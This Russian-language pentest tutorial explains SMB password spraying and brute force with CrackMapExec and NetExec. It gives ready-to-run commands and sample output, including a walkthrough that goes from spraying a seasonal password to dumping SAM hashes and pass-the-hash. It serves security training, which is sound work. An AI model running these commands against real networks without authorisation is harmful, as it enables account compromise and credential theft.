# Брутфорс SMB-учётных записей с использованием CrackMapExec и NetExec

## Контекст, эволюция инструментов и место в пентесте

**CrackMapExec** (CME, `cme`) долгое время был де-факто стандартом для автоматизации атак на сервисы Windows‑сетей, в первую очередь — на протокол SMB. Проект, созданный byt3bl33d3r (`@byt3bl33d3r`), объединил в одной кодовой базе перебор учётных данных, разведку общих ресурсов, дампинг секретов и выполнение команд, за что получил прозвище «швейцарский нож» для Active Directory. В декабре 2023 года оригинальный репозиторий [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) был заархивирован с пометкой «maintenance stopped», однако сообщество быстро отреагировало форком — **NetExec** (исполняемый файл `netexec`, также доступен по команде `nxc`). NetExec продолжает идею CME, расширяя набор протоколов, улучшая производительность и исправляя известные ошибки, включая падения из-за не‑UTF‑8 символов в файлах паролей (UnicodeDecodeError, описанный в [Issue #553](https://github.com/byt3bl33d3r/CrackMapExec/issues/553)). Оба инструмента написаны на Python и используют библиотеки [impacket](https://github.com/fortra/impacket) для низкоуровневой работы с протоколами, что делает их поведение близким к атакам, реализуемым вручную.

В пентесте атаки на SMB относятся к этапу разведки и начального доступа, реже — к lateral movement. SMB (Server Message Block) обеспечивает файловый обмен, удалённое выполнение команд и службу Active Directory. Аутентификация по SMB использует протокол NTLM (в среде AD также Kerberos), а значит, перебор учётных данных напрямую затрагивает доменные политики блокировок. Поэтому классический «брутфорс» (много попыток на одну учётную запись) быстро приведёт к lockout-у. Основной сценарий, реализуемый через CME/NetExec — **password spraying**: фиксированный пароль (или небольшой словарь) проверяется против большого списка пользователей. Инструменты также поддерживают гибридные режимы, передачу хэшей NTLM (Pass-the-Hash) и Kerberos-билетов, но базовый объект данного конспекта — именно перебор учётных данных SMB.

Ниже представлена сравнительная таблица, фиксирующая ключевые различия между инструментами и разграничивающая смежные понятия.

| **Элемент** | **Ключевые признаки** | **Примечание / индикатор в пентесте** |
|-------------|------------------------|--------------------------------------|
| **CrackMapExec (cme)** | Проект заархивирован в 2023; синтаксис `cme smb <target> ...`; поддержка SMB, MSSQL, WinRM, SSH | При установке в Kali Linux до 2024 года; может падать на юникодных паролях. Последняя версия в репозиториях apt устарела. |
| **NetExec (netexec/nxc)** | Форк CME, активная разработка на GitHub ([Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)); расширенная поддержка протоколов (FTP, LDAP, RDP, WMI и др.); более стабильная работа с юникодом | Рекомендуется к использованию в современных проектах; синтаксис почти идентичен cme, но флаги дополнены (например, `--no-bruteforce` для spraying без комбинаторики) |
| **Password spraying** | Проверка одного пароля (или 2–4) против десятков / сотен учётных записей; ключевой флаг `--continue-on-success`, чтобы не останавливаться после первого успеха | Характерный признак — низкая частота попыток на одну учётку; часто детектируется по WinEventID 4625 с одинаковым паролем на разных пользователях |
| **Традиционный brute‑force** | Много попыток на одного пользователя; для SMB почти не применяется из‑за блокировок, но реализуется через `-u user.txt -p pass.txt` без флага `--no-bruteforce` | Инструменты по умолчанию пробуют все комбинации из файлов; при большом словаре быстро вызовет lockout |
| **Pass-the-Hash** | Аутентификация с использованием NTLM‑хэша вместо пароля; флаг `-H` | Не является перебором, но часто комбинируется после получения хэша; проверка локального администратора часто выглядит как `-u admin -H <hash> --local-auth` |

Таким образом, несмотря на формальную «преемственность», следует рассматривать NetExec как текущий рабочий инструмент, а CrackMapExec — как его историческую основу, знание которой всё ещё необходимо при работе с устаревшими сборками или старыми отчётами.

## Внутреннее устройство брутфорса SMB и ключевые компоненты

Механизм перебора учётных данных SMB в CME/NetExec базируется на цикле: для каждой цели (target) и каждой пары (пользователь, пароль) инструмент устанавливает SMB‑соединение, выполняет NTLM‑аутентификацию (по умолчанию) и интерпретирует код ошибки, возвращаемый сервером. Эта логика одинакова для обоих инструментов, поэтому ниже она описана на примере NetExec с указанием отличий, унаследованных от CME.

**Цикл перебора и управление попытками**

```text
Для каждого target из списка:
    Для каждого пользователя U из user_list:
        Для каждого пароля (или хэша) P из pass_list:
            1. SMB-подключение к порту 445 (или --port)
            2. Отправка сессионного запроса NTLMSSP с учётными данными U:P (или U, H)
            3. Приём ответа сервера:
               - STATUS_SUCCESS (0x00000000) → успех
               - STATUS_LOGON_FAILURE (0xC000006D) → неверные данные
               - STATUS_ACCOUNT_LOCKED_OUT (0xC0000234) → учётка заблокирована
               - STATUS_PASSWORD_MUST_CHANGE и т.д.
            4. Обработка результата:
               - запись в лог, вывод на экран (цветная отметка: зелёный для успеха, красный для ошибки)
               - проверка флагов --continue-on-success (продолжать после успеха) и --fail-limit
            5. Если установлен --no-bruteforce, перебор выполняется построчно без полного декартова произведения: пользователь1 → пароль1, пользователь2 → пароль2 и т.д. (spraying одного пароля на каждого пользователя)
```

Порядок обхода цели и учётных записей соответствует последовательности в файлах. Режим «no-bruteforce» критически важен для spraying: он гарантирует, что каждая учётная запись тестируется только с **одним** паролем из соответствующей строки списка паролей (или из нескольких переданных через пробел), а не со всеми возможными комбинациями.

**Аутентификация и поддерживаемые методы**

SMB в Windows-средах принимает несколько методов:

- **NTLM-аутентификация (по умолчанию).** Инструмент вычисляет NTLM-ответ на challenge, отправленный сервером, используя переданный пароль или хэш. Пароль преобразуется в NTLM-хэш в памяти. Уязвимость: если SMB-подписывание отключено, возможен relay-атака (инструмент генерирует список relay-целей через `--gen-relay-list`).
- **Kerberos-аутентификация.** Включается флагом `-k` (или `--use-kcache` для использования кэша Kerberos на Linux). Инструмент запрашивает TGT для указанного пользователя и затем предъявляет билет сервису `cifs/имя_хоста`. Необходим доступ к KDC (контроллеру домена) и корректная синхронизация времени. Применяется в основном для проверки привилегий после получения билета, но не для массового перебора, так как Kerberos pre-authentication быстро вызывает события аудита и блокировки.
- **Pass-the-Hash.** Вместо пароля передаётся `-H NT_HASH`. Внутренне это тот же NTLM-обмен, но с пропуском хэширования. Инструмент поддерживает передачу как LM:NT, так и только NT.
- **Local-аутентификация.** Флаг `--local-auth` изменяет цель аутентификации на локальную SAM целевого компьютера (логин вида `.\username`), а не на домен. Полезно для проверки локальных административных учётных записей.

**Управление таймаутами и потоками**

Параметры `-t THREADS` и `--timeout TIMEOUT` (по умолчанию 5 сек и 10 соответственно) определяют, сколько параллельных потоков выполняют проверку. Повышение числа потоков ускоряет перебор, но увеличивает нагрузку на сеть и вероятность пропуска STATUS_PENDING или срабатывания временных блокировок на стороне сервера. Ключ `--jitter INTERVAL` вносит случайную задержку между попытками, затрудняя детектирование шаблонных атак. Все эти параметры унаследованы от CME и идентичны в NetExec.

**Структура файлов с учётными данными**

Файлы пользователей и паролей — простые текстовые файлы с одной записью на строку. CME имел известную проблему с кодировкой: если файл содержал символы не UTF-8 (например, Windows-1252), возникал `UnicodeDecodeError`. NetExec использует более устойчивую обработку: при невозможности декодирования применяется fallback-кодировка, либо файл читается как бинарный с заменой некорректных байт. Рекомендуется всегда проверять файл с учётными данными утилитой `file -i` и, при необходимости, перекодировать через `iconv -f WINDOWS-1252 -t UTF-8`.

**Обработка статусов SMB и различение привилегий**

Помимо успеха/неудачи, NetExec (как и CME) проверяет, обладает ли аутентифицированный пользователь правами локального администратора на целевом хосте. Это делается путём попытки записи в служебный ресурс `ADMIN$` или вызовом RPC-функции `OpenSCManagerW`. Если операция удаётся, в выводе появляется маркер `(Pwn3d!)`. Это важно, поскольку успешная аутентификация не всегда означает административный доступ, а именно он нужен для следующего этапа — дампа секретов.

Для наглядного сопоставления методов перебора и ключевых опций ниже приведена таблица.

| **Режим перебора** | **Типичный синтаксис NetExec** | **Важные флаги** | **Риск блокировки** |
|---------------------|-------------------------------|------------------|---------------------|
| Password spraying (один пароль) | `netexec smb 10.0.0.0/24 -u users.txt -p 'Summer2025!' --continue-on-success` | `--continue-on-success` обязателен, иначе остановится после первого успеха | Низкий, если порог блокировки больше 1 попытки за интервал |
| Spraying нескольких паролей в одной команде | `nxc smb target -u users.txt -p 'P@ss1' 'P@ss2' --continue-on-success` | Пароли через пробел; каждый проверяется на всём списке пользователей | Контролируется таймаутами и `--jitter` |
| Параллельный перебор «строка в строку» (режим «no-bruteforce») | `netexec smb target -u users.txt -p passlist.txt --no-bruteforce --continue-on-success` | Без `--no-bruteforce` будет полное декартово произведение | Средний: первая же строчка с неверным паролем на одного пользователя, затем на следующего и т.д. |
| Полный brute-force (на одного пользователя) | `netexec smb target -u admin -p rockyou.txt` | Каждый пароль тестируется на `admin`; `--fail-limit LIMIT` для остановки после N неудач | Высокий: более 3–5 попыток обычно приводит к блокировке |
| Проверка на локального админа с хэшем | `netexec smb target -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth` | `--local-auth` заставляет проверять локальную SAM | Lockout на конкретном хосте; не распространяется на домен |

Таблица не охватывает Kerberos-режимы — они редко применяются именно для перебора, так как требуют предварительного получения билетов или вызывают события 4771 (Kerberos pre-authentication failed), что гораздо более заметно, чем события 4625 (NTLM). Однако NetExec интегрирует Kerberos-аутентификацию через флаг `-k` и может использоваться для точечной проверки доступа.

## Применение и работа с CrackMapExec / NetExec на практике

В практическом пентесте граница между CME и NetExec сегодня определяется версией ПО и возможностью установки. Основные сценарии перебора, описанные ниже, актуальны для NetExec; для CME синтаксис будет идентичен, за исключением исполняемого имени (`cme` вместо `netexec`). Рекомендуется использовать NetExec, поскольку он содержит исправления ошибок, в том числе краши при не‑UTF‑8 данных, и активно поддерживается.

### Установка и первичная проверка

NetExec устанавливается через `pipx` (рекомендуемый метод из [официальной документации](https://www.netexec.wiki/)) или пакетным менеджером в Kali:

```bash
# Способ 1: pipx (актуальная версия из исходников)
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec

# Способ 2: apt (версия из репозитория Kali, может отставать)
sudo apt update && sudo apt install netexec
```

Проверка версии и доступных протоколов:

```bash
netexec --version
# Вывод: 1.3.0 - NeedForSpeed - a5ec90e4

netexec --help
# Показывает список протоколов: smb, ldap, winrm, mssql, ssh, ftp, rdp, vnc, wmi, nfs
```

### Типовые операции перебора SMB-учёток

**1. Базовая разведка без учётных данных (нулевая сессия).** Позволяет определить, какие хосты отвечают на SMB и включено ли SMB-подписывание. Флаг `--gen-relay-list` создаёт файл с адресами уязвимыми к relay-атакам.

```bash
# Простое сканирование подсети
netexec smb 192.168.1.0/24

# Генерация списка для relay-атак
netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

Вывод строки вида `SMB 192.168.1.10 445 DC01 [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True)` даёт имя, версию, признак подписывания. Если подписывание `False`, цель уязвима для relay.

**2. Password spraying с одним паролем.** Классический стартовый вектор после сбора имён пользователей (из AD, LinkedIn или `--rid-brute`). Важно всегда использовать `--continue-on-success`, чтобы не пропустить остальные учётки.

```bash
# Использование списка пользователей и одного пароля
netexec smb 10.10.10.0/24 -u users.txt -p 'Summer2025!' --continue-on-success

# Пример вывода:
# SMB 10.10.10.25 445 FILESRV  [+] corp.local\jdoe:Summer2025! 
# SMB 10.10.10.25 445 FILESRV  [-] corp.local\asmith:Summer2025! STATUS_LOGON_FAILURE
```

Успешные строки отмечаются `[+]` с указанием домена\пользователя и пароля. Ошибка `STATUS_LOGON_FAILURE` означает неверные данные, но не блокировку. Если сработала блокировка, будет `STATUS_ACCOUNT_LOCKED_OUT`.

**3. Проверка нескольких паролей против списка пользователей (точечный spraying).** Пароли передаются через пробел:

```bash
netexec smb filesrv.corp.local -u users.txt -p 'P@ssw0rd' 'Welcome1' 'Fall2024!' --continue-on-success
# Вывод: каждый пароль тестируется на каждом пользователе из файла.
```

**4. Spraying с использованием файла паролей в режиме «no‑bruteforce».** Обеспечивает попарную проверку: пользователь из строки N получает пароль из строки N. Полезно, когда есть дамп паролей от пользователей (например, скомпрометированных в другом месте) и нужно быстро проверить переиспользование.

```bash
netexec smb dc01.corp.local -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# Логика: user1+pass1, user2+pass2, ... userN+passN
```

Важно помнить, что без `--no-bruteforce` инструмент выполнит декартово произведение: для каждого пользователя все пароли. Риск lockout резко возрастает.

**5. Проверка локальных административных учёток с известным хэшем.** После получения хэша локального администратора (через secretsdump, lsassy и т.п.) его можно мгновенно проверить на многих хостах подсети:

```bash
netexec smb 10.10.10.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth
# Успешная аутентификация с правами админа покажет: [+] ... (Pwn3d!)
```

Название компьютера, версия ОС и `(Pwn3d!)` указывают, что на данном хосте хэш принадлежит локальному администратору. Это классический lateral movement сценарий.

**6. Комбинирование перебора с разведывательными модулями.** NetExec позволяет одновременно собирать информацию о пользователях, группах, сессиях и т.п. Для этого используются модули `-M` и специальные флаги SMB. Однако при переборе учётных данных основная цель именно проверка доступа; разведка обычно запускается отдельно после аутентификации.

```bash
# Пример: после успешного spraying можно сразу выгрузить список сессий на найденных хостах (если пользователь админ)
netexec smb 10.10.10.25 -u jdoe -p 'Summer2025!' --sessions
```

**7. Типичные ошибки и способы их устранения**

- **UnicodeDecodeError / краш при чтении файла.** В CrackMapExec эта ошибка исправлена форком; в NetExec проблема также решается, но иногда файл, созданный в Windows-блокноте, содержит BOM или символы CP1251. Решение: `iconv -f CP1251 -t UTF-8 users.txt > users_utf8.txt`.
- **Слишком агрессивный перебор вызывает блокировку учёток.** Если в выводе появляется много `STATUS_ACCOUNT_LOCKED_OUT`, установите `--jitter 2` и уменьшите число потоков `-t 2`. Также полезно перепроверить порог блокировок в доменной политике (обычно 5–10 за 30 минут).
- **Неверный синтаксис spraying без `--continue-on-success`** приводит к остановке после первого успеха. В больших подсетях это критично: инструмент не проверяет остальных.
- **Использование дефисов и специальных символов в паролях.** Если пароль начинается с `-`, bash может интерпретировать его как опцию. Лучше заключать пароль в одиночные кавычки и использовать `--password` с экранированием или передавать через файл.
- **Сетевые таймауты.** Иногда цель недоступна по SMB, но ICMP-пинг проходит. Используйте `--timeout 3` для ускорения и `--smb-timeout` для специфичного таймаута SMB-сессии.

**8. Интеграция с другими инструментами вывода.** Результаты NetExec можно сохранять в лог (`--log netexec.log`) и затем разбирать, например, для создания списка скомпрометированных пар «хост:учётка:пароль». Это стандартная практика в скриптах автоматизации.

```bash
netexec smb targets.txt -u users.txt -p 'Spring2024!' --continue-on-success --log results.log
cat results.log | grep '[+]' | awk -F' ' '{print $2, $4, $6}' > creds.txt
```

Такая интеграция применяется в пайплайнах continuous pentesting.

Таким образом, применение обоих инструментов для брутфорса SMB сводится к умелой настройке режима перебора, правильной комбинации файлов и флагов, а также анализу кодов ошибок для избежания блокировок и максимизации покрытия.

## Сквозной практический пример: от spraying к захвату учётной записи

**Исходные условия:** пентестер только что завершил внешнюю разведку компании CORP. В ходе OSINT удалось собрать список из 118 учётных записей в формате `first.last` (например, john.doe). Внутренняя подсеть офиса — 10.11.1.0/24, доступна с хоста пентестера через VPN. Известно, что политика паролей требует сложности, минимальная длина 8 символов, и по слухам в компании часто используют сезонные шаблоны. Необходимо найти первую точку входа в сеть.

**Шаг 1. Сканирование подсети и определение доступных SMB‑хостов.**

```bash
netexec smb 10.11.1.0/24 --gen-relay-list relay.txt
```

*Ожидаемый вывод:*
```
SMB 10.11.1.10 445 DC01 [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:corp.local) (signing:True)
SMB 10.11.1.25 445 FILESRV [*] Windows 10.0 Build 17763 x64 (name:FILESRV) (domain:corp.local) (signing:False)
SMB 10.11.1.33 445 HR-DESKTOP [*] Windows 10.0 Build 19044 x64 (name:HR-DT01) (domain:corp.local) (signing:False)
...
```

Файл `relay.txt` заполняется адресами с signing:False (*иллюстративно*). Для нашего сценария важен факт, что SMB доступен на многих машинах.

**Шаг 2. Подготовка списка пользователей из собранных имён.** Создаём файл `corp_users.txt`, каждая строка — `first.last`.

```bash
# пример содержимого файла corp_users.txt:
john.doe
jane.smith
robert.johnson
emily.davis
...
```

**Шаг 3. Password spraying с сезонным паролем «Summer2025!» на все хосты подсети.** Используем `--continue-on-success` и потоков 10 для скорости.

```bash
netexec smb 10.11.1.0/24 -u corp_users.txt -p 'Summer2025!' --continue-on-success -t 10
```

*Ожидаемый вывод (иллюстративная схема, конкретные имена зависят от среды):*
```
SMB 10.11.1.25 445 FILESRV [+] corp.local\robert.johnson:Summer2025!
SMB 10.11.1.33 445 HR-DT01 [-] corp.local\emily.davis:Summer2025! STATUS_LOGON_FAILURE
SMB 10.11.1.10 445 DC01 [-] corp.local\john.doe:Summer2025! STATUS_LOGON_FAILURE
SMB 10.11.1.25 445 FILESRV [+] ...
```

Результат: учётная запись `robert.johnson` прошла аутентификацию на FILESRV, но на других хостах нет. Отсутствие `(Pwn3d!)` подсказывает, что `robert.johnson` не является локальным администратором этого сервера.

**Шаг 4. Проверка локальных административных прав найденной учётной записи на всех хостах (повторный spraying с опросом прав).** NetExec автоматически проверяет права локального администратора после успешной аутентификации, но для этого запускается весь цикл заново. Выполним запрос только к тем хостам, где мы не получили явный отказ (опционально).

```bash
netexec smb 10.11.1.0/24 -u robert.johnson -p 'Summer2025!' --continue-on-success
```

*Возможный вывод:*
```
SMB 10.11.1.25 445 FILESRV [+] corp.local\robert.johnson:Summer2025!
SMB 10.11.1.50 445 BACKUP-NAS [+] corp.local\robert.johnson:Summer2025! (Pwn3d!)
SMB 10.11.1.10 445 DC01 [-] ... STATUS_LOGON_FAILURE
```

Обнаружено: на хосте BACKUP-NAS (10.11.1.50) пользователь имеет права локального администратора `(Pwn3d!)`. Это немедленно даёт путь к дампу SAM и LSASS для повышения привилегий и lateral movement.

**Шаг 5. Использование NetExec для извлечения NTLM-хэшей с захваченного хоста.** Уже имея административный доступ, демонстрируем `--sam` дамп локальной SAM:

```bash
netexec smb 10.11.1.50 -u robert.johnson -p 'Summer2025!' --sam
```

*Ожидаемый вывод:*
```
SMB 10.11.1.50 445 BACKUP-NAS [*] Windows 10.0 Build 19044 x64 (name:BACKUP-NAS) (domain:corp.local)
SMB 10.11.1.50 445 BACKUP-NAS [+] corp.local\robert.johnson:Summer2025! (Pwn3d!)
SMB 10.11.1.50 445 BACKUP-NAS [*] Dumping SAM hashes
SMB 10.11.1.50 445 BACKUP-NAS obtained 4 local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

Хэш администратора теперь может быть использован в атаке Pass-the-Hash на другие машины, где учётная запись `robert.johnson` не админ, но локальный Administrator имеет одинаковый хэш (общая практика в незащищённых средах).

**Ожидаемый вывод примера:** иллюстрируется полный цикл перебора SMB-учёток, начиная с spraying одного пароля по собранным именам, обнаружения валидной пары и последующего выявления хоста с административными привилегиями. Демонстрируется важность флага `--continue-on-success`, интерпретации статусов SMB и автоматизированной проверки `(Pwn3d!)`, отличающей обычного пользователя от локального администратора. На практике такой результат даёт пентестеру начальную точку опоры и хэши для дальнейшего продвижения.
